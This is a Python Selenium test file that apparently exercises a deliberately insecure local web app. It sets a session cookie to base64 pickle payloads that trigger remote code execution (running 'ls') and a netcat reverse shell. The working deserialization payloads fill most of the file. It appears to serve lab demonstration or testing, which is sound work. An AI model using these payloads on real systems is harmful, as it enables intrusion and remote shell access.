from selenium import webdriver
import unittest
import time
import HtmlTestRunner


class InsecureTest(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.driver=webdriver.Chrome('/chromedriver')
        cls.driver.implicitly_wait(10)
        cls.driver.maximize_window()
    

    def test_rce(self):
        driver = self.driver
        driver.get("http://127.0.0.1:5000/")
        time.sleep(3)

        #refresh the page to get cookie
        driver.refresh()
        time.sleep(3)
        

        #add the malicious cookie value that we got from payload1_RCE & refresh the page to observe Remote Code Execution.
        driver.add_cookie({"name":"uuid","domain":"127.0.0.1","value":"gASVKAAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SMAmxzlIWUUpQu"})
        driver.refresh()
        time.sleep(3)
        cookies = driver.get_cookies()
        for cookie in cookies:
            print(cookie)
    

    def test_reverse_shell(self):
        driver = self.driver
        driver.get("http://127.0.0.1:5000/")
        time.sleep(3)

        #refresh the page to get cookie
        driver.refresh()
        time.sleep(3)
        

        #add the malicious cookie value that we got from payload2_Reverse_shell.py & refresh the page to get Reverse Shell.
        driver.add_cookie({"name":"uuid","domain":"127.0.0.1","value":"gASVMwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBhuZXRjYXQgLWUgbG9jYWxob3N0IDExMDCUhZRSlC4="})
        driver.refresh()
        time.sleep(3)
        cookies = driver.get_cookies()
        for cookie in cookies:
            print(cookie)
    
    @classmethod
    def tearDownClass(cls):
        cls.driver.close()
        print("Test Completed")
    

if __name__ == '__main__':
    unittest.main(testRunner=HtmlTestRunner.HTMLTestRunner(output='/reports'))